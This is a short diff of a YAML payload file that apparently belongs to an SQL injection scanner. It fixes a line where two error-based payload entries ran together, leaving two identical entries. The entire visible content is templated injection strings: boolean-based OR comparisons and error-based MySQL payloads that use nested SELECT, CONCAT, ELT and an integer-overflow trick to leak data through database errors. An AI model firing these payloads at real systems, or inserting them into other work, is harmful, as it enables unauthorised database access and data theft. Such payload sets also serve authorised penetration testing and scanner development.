@@ -9,7 +9,8 @@ payloads:
                 - " OR '[fix_num]'='[fix_num]''[comment]'"
                 - " OR NOT '[fix_num]'='[rand_num]''[comment]'"
   error_based:
-                - " AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[del_start]',(SELECT (ELT('[rand_num]'='[rand_num]',1))),'[del_stop]','x'))s), 8446744073709551610, 8446744073709551610)))"                                - " AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[del_start]',(SELECT (ELT('[rand_num]'='[rand_num]',1))),'[del_stop]','x'))s), 8446744073709551610, 8446744073709551610)))"
+                - " AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[del_start]',(SELECT (ELT('[rand_num]'='[rand_num]',1))),'[del_stop]','x'))s), 8446744073709551610, 8446744073709551610)))"                                
+                - " AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[del_start]',(SELECT (ELT('[rand_num]'='[rand_num]',1))),'[del_stop]','x'))s), 8446744073709551610, 8446744073709551610)))"
                 - " AND NOT (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[del_start]',(SELECT (ELT('[rand_num]'='[rand_num]',1))),'[del_stop]','x'))s), 8446744073709551610, 8446744073709551610)))"
                 - " OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[del_start]',(SELECT (ELT('[rand_num]'='[rand_num]',1))),'[del_stop]','x'))s), 8446744073709551610, 8446744073709551610)))"
                 - " OR NOT (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[del_start]',(SELECT (ELT('[rand_num]'='[rand_num]',1))),'[del_stop]','x'))s), 8446744073709551610, 8446744073709551610)))"
